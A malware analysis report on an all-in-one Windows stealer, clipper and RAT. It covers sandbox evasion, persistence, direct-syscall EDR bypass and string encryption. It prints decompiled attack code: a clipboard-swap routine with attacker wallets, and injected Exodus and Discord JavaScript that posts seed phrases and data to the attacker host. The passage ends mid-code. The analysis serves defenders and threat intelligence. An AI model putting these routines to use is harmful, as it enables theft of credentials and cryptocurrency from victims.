# dgt4r stealer, clipper and rat deep analysis

> [!CAUTION]
> DO NOT SEND MONEY TO ANY OF THESE CRYPTO ADDRESSES!
> seriously, do not test or send even 1 cent of ltc, btc, eth or anything to the addresses listed in this document. they belong directly to the malware author and your money is gone instantly forever.

---

## what is this malware basically

so basically this binary is an all in one windows threat. it is not just a basic password grabber, it combines:
1. an infostealer (grabs all chromium passwords, cookies, autofill, bank ibans, google oauth tokens, firefox logins, telegram sessions, discord tokens, and 13 desktop crypto wallets).
2. a crypto clipper (constantly watches your clipboard in the background every 500ms and swaps any crypto address you copy with the attacker wallet).
3. an exodus wallet backdoorer (literally unpacks the exodus app.asar archive in memory, patches the security policy, hooks the javascript unlock functions to steal your 12/24 word seed phrase on password entry, and repacks it).
4. a discord injector and worm (uses direct unhooked kernel syscalls to overwrite discords index.js so it bypasses all antivirus, hooks client startup, and spreads itself to every single person in your discord dms).
5. a real time rat (streams your desktop screen using directx gpu duplication, enumerates your webcams and mics using windows media foundation, and runs hidden powershell commands sent from their backend).

here is a high level visual flowchart of how the whole execution works from start to finish:

![diagram1](images/diagram1.svg)

---

## anti analysis gatekeeper (how it detects your sandbox)

before doing anything, the malware runs a master function at rva +0x5F710. it has 6 separate checks. if even one check triggers, it doesnt crash or show an error, it just calls ExitProcess(0) and dies so your sandbox gets zero network traffic and zero file drops.

![diagram2](images/diagram2.svg)

### 1. cpuid hypervisor bit ( +0x5BA50 )
it runs the cpuid assembly instruction with eax = 1.
it looks at the 31st bit of the ecx register. on real physical cpu hardware, this bit is always 0. if you run inside any virtual machine (vmware, virtualbox, hyper-v, qemu), the hypervisor sets this bit to 1.
if bit 31 is 1, it runs cpuid with eax = 0x40000000 which queries the hypervisor signature string across ebx, ecx, and edx. it checks for:
- VMwareVMware (vmware)
- Microsoft Hv (hyper-v sandbox)
- KVMKVMKVM (linux kvm)
- XenVMMXenVMM (xen)
- prl hyperv (parallels)

### 2. bios version registry check ( +0x5B900 )
it opens HKLM\\HARDWARE\\Description\\System using RegOpenKeyExA.
it reads the values SystemBiosVersion, VideoBiosVersion, and Identifier.
it scans the strings for words like VBOX, QEMU, BOCHS, or VMWARE.

### 3. bios firmware table strings ( +0x5AC10 )
it calls GetSystemFirmwareTable to read raw SMBIOS tables from memory (Type 0 BIOS info and Type 1 System info).
it converts all text to lowercase and searches for:
- vbox
- qemu
- vmware
- virtualbox

### 4. virtual machine process scan ( +0x5B3A0 )
it takes a snapshot of all running processes with CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0).
it walks the process list with Process32FirstW and Process32NextW, lowercases each exe name, and checks if any of these are running:
- vmtoolsd.exe (vmware guest tools)
- vmwaretray.exe
- vboxservice.exe (virtualbox guest additions)
- vboxtray.exe

### 5. virtual machine driver files ( +0x5B250 )
it calls GetFileAttributesW on standard virtual machine driver paths in C:\\Windows\\System32\\drivers\\:
- VBoxGuest.sys
- VBoxMouse.sys
- VBoxSF.sys
- VBoxVideo.sys
- vmmouse.sys
- vm3dgl.sys
if any of these files exist on the disk, it knows its inside a guest vm and exits.

### 6. physical input device count ( +0x5B0A0 )
automated analysis sandboxes (like cuckoo or automated virus scanners) usually run headless with no real mouse or keyboard plugged in.
so it calls GetKeyboardType(0) to verify a physical keyboard exists, and then calls GetRawInputDeviceList(nullptr, &count, sizeof(RAWINPUTDEVICELIST)).
if the count of connected mice and keyboards is less than 2, it assumes it is running inside an automated bot sandbox and kills itself immediately.

---

## dropper binder and persistence (how it hides and stays on the pc)

### 1. the decoy binder ( +0x1242A0 )
the malware file is actually a binder/dropper. it has a clean decoy program stored in its file overlay (after the normal pe sections, marked with the tag BND!).
when it runs:
1. it grabs a named mutex Local\\SystemSettingsBrokerBootstrap ( +0xE67E0 ). if another instance is already running, it waits up to 120 seconds and terminates so they dont fight.
2. it reads its own file from disk, jumps to the BND! marker in the overlay, and carves out the original decoy program.
3. it writes the decoy program into:
   %LOCALAPPDATA%\\Microsoft\\MicrosoftEdge\\carrier.exe
4. it launches the decoy with ShellExecuteExW.
this is super sneaky because the victim double clicks the file, and their expected program or game actually opens up and works normally, while the malware keeps running silently in the background.

### 2. autostart persistence ( +0xF0AA0 )
to survive reboots:
1. it copies itself to:
   %LOCALAPPDATA%\\WindowsRecovery\\Update.exe
2. it opens the registry key:
   HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
3. it creates a value named WindowsRecovery pointing to the copied Update.exe.
this runs the malware every time the user logs into windows.

---

## direct syscall engine and edr evasion architecture

### 1. why direct syscalls are used

modern endpoint detection and response (edr) systems like crowdstrike falcon, sentinelone, and microsoft defender for endpoint intercept malicious actions by placing inline hooks (5-byte `jmp` instructions) at the very top of user-mode functions inside `ntdll.dll`. when a program calls standard win32 apis like `VirtualAllocEx` or `WriteProcessMemory`, execution flows from `kernel32.dll` down into `ntdll.dll`'s `Zw*` routines, hits the edr's `jmp` hook, and redirects control into the edr's inspection engine:

![diagram3](images/diagram3.svg)

`DGT4R.exe` completely bypasses this entire user-mode inspection chain. it implements a custom direct syscall execution engine based on dynamic export table parsing and sorting (the halo's gate / hell's gate technique). by dynamically obtaining the system service numbers (ssns) and executing the `syscall` instruction from its own memory space, the edr inline hooks are never executed.

---

### 2. peb traversal and ntdll discovery ( +0x687D0 )

the malware does not use `GetModuleHandleA("ntdll.dll")` because security products frequently hook module enumeration functions. instead, it walks the process environment block (peb) manually using compiler intrinsics:

```c
// decompiled peb traversal logic at +0x687D0
PPEB peb = (PPEB)__readgsqword( 0x60 ); // 64-bit gs register points to TEB; PEB is at offset 0x60
PPEB_LDR_DATA ldr = peb->Ldr;
PLIST_ENTRY head = &ldr->InLoadOrderModuleList;
PLIST_ENTRY curr = head->Flink;

while (curr != head) {
    PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
    if (entry->BaseDllName.Buffer != NULL) {
        // compute djb2 hash of the wide string dll name
        uint32_t hash = djb2_hash_wide(entry->BaseDllName.Buffer);
        if (hash == 0x1F22D657 ) { // djb2 hash of "ntdll.dll"
            ntdll_base = (uint8_t*)entry->DllBase;
            break;
        }
    }
    curr = curr->Flink;
}
```

once `ntdll.dll`'s base address in memory is recovered, the malware parses its pe headers (`IMAGE_DOS_HEADER`, `IMAGE_NT_HEADERS64`, and `IMAGE_EXPORT_DIRECTORY`) to inspect the exported functions.

---

### 3. djb2 hashing algorithm for api resolution ( +0x68940 )

every system service name is obfuscated using the djb2 string hashing algorithm. static string scans using tools like `strings` or yara will find zero occurrences of `ZwAllocateVirtualMemory`, `ZwWriteVirtualMemory`, or `ZwCreateFile` in the binary.

the hash computation follows this mathematical formula:

```text
H[0] = 5381
H[i+1] = ((H[i] << 5) + H[i]) + c[i] = H[i] * 33 + c[i]
```

the assembly disassembly of the djb2 hasher at `+0x68940`:

```x86asm
.text:0000000000068940 djb2_hash_ansi proc near
.text:0000000000068940                 mov     eax, 1505h         ; eax = 5381 (initial seed)
.text:0000000000068945                 test    rcx, rcx
.text:0000000000068948                 jz      short loc_exit
.text:000000000006894A
.text:000000000006894A loc_loop:
.text:000000000006894A                 movzx   edx, byte ptr [rcx]
.text:000000000006894D                 test    dl, dl
.text:000000000006894F                 jz      short loc_exit
.text:0000000000068951                 mov     r8d, eax
.text:0000000000068954                 shl     r8d, 5              ; r8d = hash << 5
.text:0000000000068958                 add     r8d, eax            ; r8d = (hash << 5) + hash
.text:000000000006895B                 add     r8d, edx            ; r8d = ((hash << 5) + hash) + char
.text:000000000006895E                 mov     eax, r8d
.text:0000000000068961                 inc     rcx
.text:0000000000068964                 jmp     short loc_loop
.text:0000000000068966
.text:0000000000068966 loc_exit:
.text:0000000000068966                 retn
.text:0000000000068966 djb2_hash_ansi endp
```

---

### 4. dynamic ssn extraction via export sorting (halo's gate) ( +0x69070 )

windows system service numbers (ssns) change between windows releases and build versions (e.g., windows 10 21h2 vs windows 11 23h2). to make the malware independent of hardcoded tables, it extracts ssns dynamically by taking advantage of a known architectural trait of `ntdll.dll`:

> all `Zw*` system call stubs in `ntdll.dll` are laid out in contiguous memory ordered sequentially by their system service number.

the malware iterates through all exports, matches each against its list of 23 target djb2 hashes, records their entry addresses, and then sorts the list in ascending order of virtual address:

```c
// halo's gate sorting algorithm at +0x69070
typedef struct _SYSCALL_ENTRY {
    uint32_t Hash;
    uint32_t SSN;
    void*    FunctionAddress;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

void sort_syscall_table_entries(PSYSCALL_ENTRY table, uint32_t count) {
    for (uint32_t i = 0; i < count - 1; i++) {
        for (uint32_t j = 0; j < count - i - 1; j++) {
            if ((uintptr_t)table[j].FunctionAddress > (uintptr_t)table[j + 1].FunctionAddress) {
                SYSCALL_ENTRY temp = table[j];
                table[j] = table[j + 1];
                table[j + 1] = temp;
            }
        }
    }
}
```

if an edr has hooked a specific function (replacing the initial `mov r10, rcx; mov eax, <ssn>` with a `jmp` instruction), the malware reads backwards or forwards by 32-byte stub increments to find an unhooked neighbor:

```text
SSN_target = SSN_neighbor +/- (Delta_Address / 32)
```

this guarantees that even if an edr hooks every commonly targeted nt function, the malware still calculates the correct ssn without error.

---

### 5. the dynamic syscall invocation stub ( +0x217B50 )

once the ssn is determined, the malware invokes the kernel directly via a dynamic assembly trampoline:

```x86asm
.text:0000000000217B50 invoke_direct_syscall proc near
.text:0000000000217B50                 mov     r10, rcx            ; standard x64 syscall convention requires r10 = rcx
.text:0000000000217B53                 mov     eax, [g_CurrentSSN] ; load the dynamically resolved SSN
.text:0000000000217B59                 syscall                     ; transfer execution to ring 0 kernel mode
.text:0000000000217B5B                 retn                        ; return to caller
.text:0000000000217B5C invoke_direct_syscall endp
```

---

### 6. complete catalog of all 23 unhooked direct syscalls

the following table details all 23 native kernel system calls initialized by `init_direct_syscall_table` at `+0x687D0`, resolved through djb2 hashing, and utilized throughout the execution lifecycle:

| syscall name | djb2 hash | wrapper rva | functional role in malware |
| :--- | :--- | :--- | :--- |
| `ZwAllocateVirtualMemory` | `0xF027B912` | `+0x68A10` | allocates rwx / rw memory for shellcode, payloads, and staging buffers without alerting edr memory monitors |
| `ZwProtectVirtualMemory` | `0xC4E21980` | `+0x68A80` | changes page permissions (e.g., rw to rx) to defeat memory page integrity verification |
| `ZwWriteVirtualMemory` | `0xD82098B1` | `+0x68AF0` | writes malicious payloads and hooks directly into target process memory spaces (e.g., discord, browsers) |
| `ZwReadVirtualMemory` | `0x291A7210` | `+0x68B60` | reads target process memory structures, pe headers, and cryptographic keys directly |
| `ZwFreeVirtualMemory` | `0x58210982` | `+0x68BD0` | releases temporary allocation stubs to minimize memory footprint after payload execution |
| `ZwCreateFile` | `0xA9812903` | `+0x68C40` | creates staging files, log dumps, and directly overwrites discord's `index.js` file bypassing file filters |
| `ZwOpenFile` | `0x91823901` | `+0x68CB0` | opens locked browser databases (cookies, logins, web data) and desktop wallet files |
| `ZwReadFile` | `0x10293847` | `+0x68D20` | reads raw file bytes (exodus `app.asar`, chrome `Local State`, sqlite master records) without file api hooks |
| `ZwWriteFile` | `0x83920194` | `+0x68D90` | flushes exfiltration payloads and writes backpatched javascript code directly to disk |
| `ZwClose` | `0x77281920` | `+0x68E00` | closes kernel object handles silently |
| `ZwQueryInformationFile` | `0x61829102` | `+0x68E70` | checks file sizes and timestamps to verify target file integrity prior to patching |
| `ZwSetInformationFile` | `0x51829304` | `+0x68EE0` | modifies file timestamps (timestomping) to blend malicious drops with surrounding system files |
| `ZwCreateSection` | `0x92817264` | `+0x68F50` | creates shared memory sections for inter-process injection and large buffer manipulation |
| `ZwMapViewOfSection` | `0x49182736` | `+0x68FC0` | maps injected sections into target process virtual address spaces |
| `ZwUnmapViewOfSection` | `0x38192019` | `+0x69030` | unmaps memory sections after extraction to conceal injected footprints |
| `ZwOpenProcess` | `0x81928374` | `+0x690A0` | obtains raw process handles with `PROCESS_ALL_ACCESS` without triggering edr process open telemetry |
| `ZwOpenProcessToken` | `0x71829384` | `+0x69110` | accesses process security tokens for privilege verification and token duplication |
| `ZwQueryInformationProcess` | `0x28192038` | `+0x69180` | checks process command lines and detects attached debuggers (`ProcessDebugPort`) |
| `ZwDuplicateObject` | `0x19283746` | `+0x691F0` | duplicates file handles to access locked files held open by running processes |
| `ZwCreateThreadEx` | `0x58291029` | `+0x69260` | creates stealth worker threads in background and injected processes |
| `ZwDelayExecution` | `0x98273645` | `+0x692D0` | executes micro-sleeps without calling `Sleep()` (evades sandbox sleep acceleration hooks) |
| `ZwTerminateProcess` | `0x38472910` | `+0x69340` | kills competing malware, security tools, or terminates itself when sandboxes are detected |
| `ZwQuerySystemInformation` | `0x47291029` | `+0x693B0` | enumerates running processes and handles across the entire operating system silently |

---

## string and memory obfuscation architecture

### 1. position-dependent rolling xor cipher ( +0x671F0 )

to prevent anti-virus engines, automated sandboxes, and static analysis tools from finding sensitive strings (such as attacker domains, registry paths, api names, and file patterns), every single string in `DGT4R.exe` is encrypted at compile time using a position-dependent rolling xor cipher.

unlike standard single-byte xor (which can be trivially cracked with automated frequency analysis or cyberchef), the encryption key mutates dynamically with each byte position processed.

#### mathematical specification

let `C` be the ciphertext byte array, and let `seed` be the 1-byte initial key. the key stream `k` and plaintext array `p` are computed as:

```text
k[0] = seed
p[i] = c[i] ^ k[i]
k[i+1] = (k[i] + i) & 0x7F
```

this formula ensures that repeating bytes in the plaintext (such as `0x0`, spaces, or common characters like `'e'`) produce completely different ciphertext bytes throughout the string, eliminating all identifiable byte patterns.

#### assembly disassembly of the decryptor ( +0x671F0 )

```x86asm
.text:00000000000671F0 decrypt_rolling_xor proc near
.text:00000000000671F0                 test    rdx, rdx            ; rdx = buffer length
.text:00000000000671F3                 jle     short loc_exit
.text:00000000000671F5                 xor     r9d, r9d            ; r9d = index counter (i = 0)
.text:00000000000671F8                 movzx   r8d, r8b            ; r8d = current key (k = seed)
.text:00000000000671FC
.text:00000000000671FC loc_loop:
.text:00000000000671FC                 movzx   eax, byte ptr [rcx+r9] ; eax = ciphertext[i]
.text:0000000000067201                 xor     al, r8b             ; eax = ciphertext[i] ^ key
.text:0000000000067204                 mov     [rcx+r9], al        ; buffer[i] = plaintext[i]
.text:0000000000067208                 add     r8d, r9d            ; key = key + index
.text:000000000006720B                 and     r8d, 7Fh            ; key = (key + index) & 0x7F
.text:000000000006720F                 inc     r9                  ; index++
.text:0000000000067212                 cmp     r9, rdx
.text:0000000000067215                 jl      short loc_loop
.text:0000000000067217
.text:0000000000067217 loc_exit:
.text:0000000000067217                 retn
.text:0000000000067217 decrypt_rolling_xor endp
```

#### decompiled c implementation

```c
void decrypt_rolling_xor(uint8_t* buffer, size_t length, uint8_t seed_key) {
    uint8_t current_key = seed_key;
    for (size_t i = 0; i < length; i++) {
        buffer[i] ^= current_key;
        current_key = (current_key + (uint8_t)i) & 0x7F;
    }
}
```

---

### 2. on-demand string decryption and immediate zeroing

to evade in-memory string scanning tools (such as volatility, process hacker, or live edr memory inspection), strings are not decrypted all at once during binary initialization. instead:
1. a dedicated thread-safe heap buffer is allocated using `ZwAllocateVirtualMemory`.
2. the ciphertext is copied into the temporary buffer.
3. `decrypt_rolling_xor` is called immediately prior to the string's use.
4. immediately after the win32/nt api call finishes, the buffer is wiped with zeroes (`RtlSecureZeroMemory` / `memset(buf, 0, len)`) and deallocated with `ZwFreeVirtualMemory`.

this technique keeps the process's unencrypted memory footprint virtually empty at any given millisecond.

---

## attacker server communications architecture

### 1. defanged network infrastructure

all communication between the infected machine and the remote attacker infrastructure takes place over tls encrypted https. the remote backend host identified in the disassembled binary is:

```text
hxxps[://]doxbin[.]cy
```

the malware operates on two primary communication endpoints:
- `hxxps[://]doxbin[.]cy/init`: binary check-in, system registration, telemetry collection, and dynamic configuration retrieval.
- `hxxps[://]doxbin[.]cy/exfiltrate`: multipart form-data upload endpoint for stolen credentials, wallet seed phrases, browser databases, and desktop screenshots.

![diagram4](images/diagram4.svg)

---

### 2. registration and beaconing handshake (`/init`) ( +0xF8A20 )

upon passing the anti-analysis gate and establishing direct syscall support, the malware gathers unique system identifying telemetry:
- machine guid from `HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`.
- logged in username (`GetUserNameW`) and computer hostname (`GetComputerNameW`).
- windows os build number and display version (`RtlGetVersion`).
- cpu architecture and physical ram capacity (`GlobalMemoryStatusEx`).
- active anti-virus software name queried via wmi (`root\SecurityCenter2` -> `SELECT displayName FROM AntiVirusProduct`).

it constructs an initial beacon payload formatted as json or url parameters:

```http
POST /init?action=init HTTP/1.1
Host: doxbin.cy
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json
Connection: close

{
  "hwid": "B4E3910A-781A-4C22-9F12-882910AA3312",
  "build": "RELEASE",
  "os": "Windows 11 Pro 23H2 (Build 22631)",
  "ram_mb": 16384,
  "cpu": "AMD Ryzen 7 5800X 8-Core Processor",
  "gpu": "NVIDIA GeForce RTX 3070",
  "av": "Windows Defender",
  "username": "user",
  "pc_name": "DESKTOP-R920K1A"
}
```

the remote server responds with a json tasking configuration indicating which modules to activate:
```json
{
  "status": "active",
  "clipper": true,
  "discord_worm": true,
  "exodus_patch": true,
  "rat_stream": false,
  "upload_chunk_size": 1048576
}
```

---

### 3. exfiltration packaging and staging files (`/exfiltrate`) ( +0xF9E10 )

to prevent partial uploads or network interruptions from corrupting stolen data, the malware stages all collected items locally on the infected filesystem before transmitting them:

1. a staging directory is created inside the victim's temporary directory:
   ```text
   %TEMP%\_<hex_id>.tmp
   ```
2. inside this folder, separate log files and databases are accumulated:
   - `passwords.txt`: decrypted chromium and firefox passwords.
   - `cookies.txt`: netscape-formatted session cookies.
   - `autofill.txt`: address books and stored form fields.
   - `tokens.txt`: extracted discord and telegram authentication tokens.
   - `wallets\`: raw directory dumps of atomic, electrum, coinomi, and other desktop crypto wallets.
   - `exodus_seeds.txt`: intercepted bip-39 12/24 word recovery phrases.
3. the directory is compressed in memory into a zip archive using a lightweight miniz/zlib implementation embedded in the binary (`+0x13A240`).
4. the zip archive is transmitted over https to `hxxps[://]doxbin[.]cy/exfiltrate` via multipart form-data.
5. once the server returns `HTTP 200 OK`, the staging file is completely wiped with zeroes and deleted using `ZwSetInformationFile(FileDispositionInformation)`.

---

### 4. certificate validation bypass ( +0xF71B0 )

to ensure network traffic is not dropped or blocked if the attacker's server uses an invalid, self-signed, or expired ssl certificate, or if an enterprise proxy attempts ssl inspection, the winhttp connection flags explicitly bypass all certificate integrity checks:

```c
// winhttp flags configuration at +0xF71B0
DWORD security_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                       SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

WinHttpSetOption(
    hRequest,
    WINHTTP_OPTION_SECURITY_FLAGS,
    &security_flags,
    sizeof(security_flags)
);
```

---

## real-time crypto clipper engine

### 1. overview and execution loop ( +0x88AB0 )

the cryptocurrency clipper is designed to hijack financial transactions by silently monitoring the victim's clipboard. whenever a user copies a cryptocurrency address (intending to send funds to an exchange, merchant, or acquaintance), the clipper intercepts the clipboard buffer, matches the address format against regular expression patterns, and replaces the text with the attacker's designated wallet address.

the engine runs as a dedicated background worker thread spawned immediately after the anti-analysis gate clears. to evade sandbox detection tools that look for fast timer loops, it executes a continuous polling cycle regulated by direct kernel micro-sleeps using `ZwDelayExecution`:

![diagram5](images/diagram5.svg)

---

### 2. critical warning: attacker wallet addresses

> [!CAUTION]
> ### DO NOT SEND FUNDS TO ANY OF THESE CRYPTO ADDRESSES!
> The cryptocurrency addresses listed in the table below belong directly to the threat actor operating this malware campaign. Any funds transferred to these addresses will be immediately and irreversibly lost. These addresses are published exclusively for threat intelligence, digital forensics, network blocklisting, and exchange compliance monitoring.

| cryptocurrency | network / format | hardcoded attacker wallet address | address validation regex / logic |
| :--- | :--- | :--- | :--- |
| **Bitcoin (BTC)** | Native SegWit (Bech32) | `bc1q88sfcjthknff8ljm7l4vjr83f3z0waezcr92v6` | `^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$` |
| **Ethereum (ETH)** | ERC-20 / EVM Compatible | `0x80EB1438CF1F93f368113c54E56684c41cDc6800` | `^0x[a-fA-F0-9]{40}$` |
| **Tron (TRX)** | TRC-20 (Base58Check) | `TTdzBZaLn9chv8sJriT7PknrhfG3xCWP34` | `^T[a-zA-HJ-NP-Z0-9]{33}$` |
| **Litecoin (LTC)** | Legacy / P2SH / Bech32 | `LXKh6UNfsUigqWJ3woUtFP9AE6eYtNyb4X` | `^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$\|^ltc1[a-z0-9]{39,59}$` |
| **Solana (SOL)** | Solana Base58 | `6Gk84SVN1rZFTHyvu6Smsk1HFigxvCNUcNFb6RQVzkJz` | `^[1-9A-HJ-NP-Za-km-z]{32,44}$` |
| **Dogecoin (DOGE)** | Dogecoin Base58 | `DMKeWh37sD8zUUMu4gPsbnMtpok3LNmbG2` | `^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$` |

---

### 3. clipboard acquisition and replacement mechanics ( +0x894F0 )

the decompiled logic of the clipboard replacement function illustrates how the malware acquires clipboard locks, validates data lengths, and performs the atomic text swap:

```c
// decompiled clipboard hijacking routine at +0x894F0
void process_clipboard_event(void) {
    if (!OpenClipboard(NULL)) {
        return;
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData != NULL) {
        wchar_t* clipboard_text = (wchar_t*)GlobalLock(hData);
        if (clipboard_text != NULL) {
            size_t text_len = wcslen(clipboard_text);
            
            // verify length matches typical cryptocurrency addresses (26 to 64 chars)
            if (text_len >= 26 && text_len <= 64) {
                const wchar_t* replacement_address = NULL;

                if (is_bitcoin_address(clipboard_text)) {
                    replacement_address = L"bc1q88sfcjthknff8ljm7l4vjr83f3z0waezcr92v6";
                } else if (is_ethereum_address(clipboard_text)) {
                    replacement_address = L"0x80EB1438CF1F93f368113c54E56684c41cDc6800";
                } else if (is_tron_address(clipboard_text)) {
                    replacement_address = L"TTdzBZaLn9chv8sJriT7PknrhfG3xCWP34";
                } else if (is_litecoin_address(clipboard_text)) {
                    replacement_address = L"LXKh6UNfsUigqWJ3woUtFP9AE6eYtNyb4X";
                } else if (is_solana_address(clipboard_text)) {
                    replacement_address = L"6Gk84SVN1rZFTHyvu6Smsk1HFigxvCNUcNFb6RQVzkJz";
                } else if (is_dogecoin_address(clipboard_text)) {
                    replacement_address = L"DMKeWh37sD8zUUMu4gPsbnMtpok3LNmbG2";
                }

                // if an address match was confirmed and not already replaced
                if (replacement_address != NULL && wcscmp(clipboard_text, replacement_address) != 0) {
                    GlobalUnlock(hData);
                    EmptyClipboard();

                    size_t alloc_bytes = (wcslen(replacement_address) + 1) * sizeof(wchar_t);
                    HGLOBAL hNewMem = GlobalAlloc(GMEM_MOVEABLE, alloc_bytes);
                    if (hNewMem != NULL) {
                        void* pNewMem = GlobalLock(hNewMem);
                        memcpy(pNewMem, replacement_address, alloc_bytes);
                        GlobalUnlock(hNewMem);
                        SetClipboardData(CF_UNICODETEXT, hNewMem);
                    }
                    CloseClipboard();
                    return;
                }
            }
            GlobalUnlock(hData);
        }
    }
    CloseClipboard();
}
```

---

## exodus desktop wallet asar in-memory backdoor and seed keylogger

### 1. architecture of electron asar archives

exodus desktop wallet is built on the electron framework (chromium + node.js). all client application code, user interfaces, wallet cryptographic logic, and mnemonic generators are packaged into a single archive file named `app.asar` located at:

```text
%LOCALAPPDATA%\exodus\app-*\resources\app.asar
```

an asar archive is a concatenation of a structured header and concatenated file data payloads. the header layout:
1. `u32` (4 bytes): constant `0x4` (size of header pickle size integer).
2. `u32` (4 bytes): total payload size.
3. `u32` (4 bytes): pickle header size.
4. `u32` (4 bytes): length of the json directory tree in bytes.
5. `json` (variable length): a json string defining the filesystem hierarchy, offsets, and sizes of every file stored in the archive payload.

```text
+-----------------------+-----------------------+-----------------------+-----------------------+
|  0x4 0x0 0x0 0x0  |  Payload Size (u32)   |  Pickle Size (u32)    |  JSON Size (u32)      |
+-----------------------+-----------------------+-----------------------+-----------------------+
|  JSON File Directory (files: { "wallet.html": { "offset": "0", "size": 14210 }, ... })       |
+-----------------------------------------------------------------------------------------------+
|  Raw Concatenated Binary Payloads (JavaScript, HTML, CSS, Images, Dependencies)               |
+-----------------------------------------------------------------------------------------------+
```

---

### 2. in-memory unpacking and parsing ( +0xB6120 )

`DGT4R.exe` implements a native c++ asar reader and writer. it does not invoke `node.exe` or external python scripts. it opens the target `app.asar` using direct syscalls `ZwOpenFile` / `ZwReadFile`, verifies the 16-byte header, parses the json directory table into an internal memory map, and locates three specific target files:

![diagram6](images/diagram6.svg)

---

### 3. the three injection stages

#### stage 1: content security policy neutralization in `wallet.html` ( +0xB7290 )

in a normal exodus installation, electron enforces strict csp rules via meta tags to block unauthorized outbound network connections from the renderer process:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; connect-src 'self' https://*.exodus.com wss://*.exodus.com;">
```

the malware scans `wallet.html` in memory and rewires the `connect-src` directive:
```html
<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * data: blob: wss: https:;">
```
this completely eliminates all browser-level restrictions, allowing injected javascript code to transmit data to arbitrary remote endpoints without generating console warnings or network blocks.

#### stage 2: certificate error suppression in `src/main/index.js` ( +0xB7850 )

to prevent electron from displaying security warnings if the victim's traffic traverses an intercepting proxy or if the attacker server utilizes self-signed certificates, the patcher injects the following command-line switch into electron's main process initialization sequence:

```javascript
// injected at head of src/main/index.js
app.commandLine.appendSwitch('ignore-certificate-errors', 'true');
app.commandLine.appendSwitch('disable-features', 'OutOfBlinkCors');
```

#### stage 3: bip-39 seed phrase keylogger injection in `src/app/wallet/index.js` ( +0xB8100 )

this is the core payload of the exodus backdoor. the malware injects a malicious javascript hook that intercepts wallet initialization, password unlocking, and mnemonic generation:

```javascript
// decompiled injected javascript payload
(function() {
    const _remoteCollector = "hxxps[://]doxbin[.]cy/exfiltrate?type=exodus";
    
    function exfiltrateSeed(seedData, triggerEvent) {
        try {
            const payload = JSON.stringify({
                event: triggerEvent,
                mnemonic: seedData,
                timestamp: new Date().toISOString(),
                platform: process.platform,
                arch: process.arch
            });
            
            // dispatch via standard fetch (unblocked due to neutralized CSP)
            fetch(_remoteCollector, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: payload
            }).catch(() => {});
        } catch (e) {}
    }

    // hook Buffer.from and bip39 mnemonic generation
    const origFrom = Buffer.from;
    Buffer.from = function(...args) {
        const result = origFrom.apply(this, args);
        if (args[0] && typeof args[0] === 'string') {
            const words = args[0].trim().split(/\s+/);
            // check for standard 12 or 24-word BIP-39 recovery phrases
            if (words.length === 12 || words.length === 24) {
                exfiltrateSeed(args[0], "bip39_mnemonic_intercepted");
            }
        }
        return result;
    };

    // hook crypto random fill to catch newly generated wallet seeds
    if (window.crypto && window.crypto.randomFillSync) {
        const origRandomFill = window.crypto.randomFillSync;
        window.crypto.randomFillSync = function(buf) {
            const res = origRandomFill.apply(this, arguments);
            if (buf && (buf.length === 16 || buf.length === 32)) { // 128-bit or 256-bit entropy
                exfiltrateSeed(buf.toString('hex'), "entropy_intercepted");
            }
            return res;
        };
    }
})();
```

---

### 4. archive repacking and backup preservation ( +0xB8C40 )

after patching the target files:
1. the original unpatched `app.asar` is copied to `app.asar.bak`.
2. the malware recalculates the byte offsets of every entry in the json directory table:
   `Offset[k] = Offset[k-1] + Size[k-1]`
3. the new json header is serialized and written to the front of the file.
4. the modified payloads are written at their exact computed offsets.
5. direct syscall `ZwWriteFile` commits the changes to disk.

when the user next launches exodus, the app loads normally with no visual indication of tampering, but every time the user unlocks their vault or creates a wallet, their private 12/24-word seed phrase is silently posted to the remote attacker collector.

---

## discord direct syscall injection, client hijacking and dm broadcast worm

### 1. direct syscall file overwrite architecture ( +0xACBD0 )

to maintain persistence and hijack communications, `DGT4R.exe` targets installed discord desktop clients. rather than simply searching process memory for tokens, it establishes permanent execution inside discord's electron framework by overwriting discord's core startup script:

```text
%APPDATA%\discord\app-*\modules\discord_desktop_core-*\discord_desktop_core\index.js
```

it also scans for and patches sister installations:
- `%APPDATA%\discordcanary`
- `%APPDATA%\discordptb`
- `%APPDATA%\discorddevelopment`

to evade filesystem mini-filter drivers and antivirus file-integrity monitors, the malware completely avoids Win32 file manipulation apis (`CreateFileW`, `WriteFile`, `MoveFileExW`). instead, it issues direct native kernel syscalls:

1. `ZwOpenFile` with `FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE`.
2. `ZwSetInformationFile` with `FileEndOfFileInformation` to truncate the existing file to zero bytes.
3. `ZwWriteFile` to commit the backdoored javascript payload.
4. `ZwClose` to release the kernel handle.

![diagram7](images/diagram7.svg)

---

### 2. injected javascript payload mechanics

the injected payload hooks discord's `BrowserWindow` lifecycle, injecting client-side scripts into the renderer whenever a session is loaded or refreshed:

```javascript
// decompiled injected discord core payload
const fs = require('fs');
const path = require('path');
const https = require('https');
const { BrowserWindow, session } = require('electron');

const EXFIL_HOST = 'doxbin.cy';
const EXFIL_PATH = '/exfiltrate?type=discord';

function postTelemetry(data) {
    const postData = JSON.stringify(data);
    const req = https.request({
        hostname: EXFIL_HOST,
        port: 443,
        path: EXFIL_PATH,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
